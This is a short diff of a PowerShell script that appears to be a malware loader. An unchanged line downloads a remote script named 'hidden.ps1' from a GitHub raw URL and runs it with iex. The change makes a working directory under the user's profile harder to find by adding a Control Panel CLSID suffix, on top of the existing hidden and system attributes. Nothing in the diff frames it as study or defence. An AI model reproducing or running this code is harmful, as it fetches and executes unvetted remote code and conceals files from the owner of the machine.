@@ -1,7 +1,8 @@
 $skid = "skid"
 iex (iwr -uri "https://raw.githubusercontent.com/43a1723/test/main/Extras/hidden.ps1" -useb)
 
-$dir = "$env:userprofile\150F4013"
+$rdir = "$env:userprofile\150F4013"
+$dir = "$rdir.{21EC2020-3AEA-1069-A2DD-08002B30309D}"
 New-Item -ItemType Directory -Path $dir
 attrib +h +s $dir
 
